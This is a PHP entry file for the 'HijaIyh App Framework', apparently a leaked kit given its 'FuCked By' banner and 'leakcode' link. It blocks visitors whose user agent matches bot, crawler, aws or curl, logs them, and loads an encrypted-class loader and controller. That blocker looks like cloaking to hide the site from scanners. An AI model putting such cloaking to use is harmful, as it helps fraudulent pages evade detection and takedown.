<?php 
/*
    ▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
    ██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
    ██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
    ▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
    .▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀
    FuCked By [!]DNThirTeen
    https://www.facebook.com/groups/leakcode/
*/
/** HijaIyh App Framework
* @author justalinko
* @version 2.1
**/

/** Basic blocker */
if(preg_match("/bot|crawler|spider|aws|curl|slurp/",$_SERVER['HTTP_USER_AGENT']))
{
	file_put_contents(__DIR__.'/HijaIyh_App/stats/bot.hijaiyh.html','Block by basic bot',FILE_APPEND);
    header('HTTP/1.1 403 Forbidden');exit;
}
/** end basic blocker */



// named files.

$iyh['autoloader'] = 'autoloader.php';

$iyh['controller'] = 'AppControl.php';

$iyh['checker'] = 'AppCheck.php';

// named dir.

$iyh['app_path'] = 'HijaIyh_App/';


define('HADIR',__DIR__.DIRECTORY_SEPARATOR);



require_once(HADIR.$iyh['app_path'].'/class/Aes.iyh.php');
require_once(HADIR.$iyh['autoloader']);
require_once(HADIR.$iyh['app_path'].$iyh['controller']);
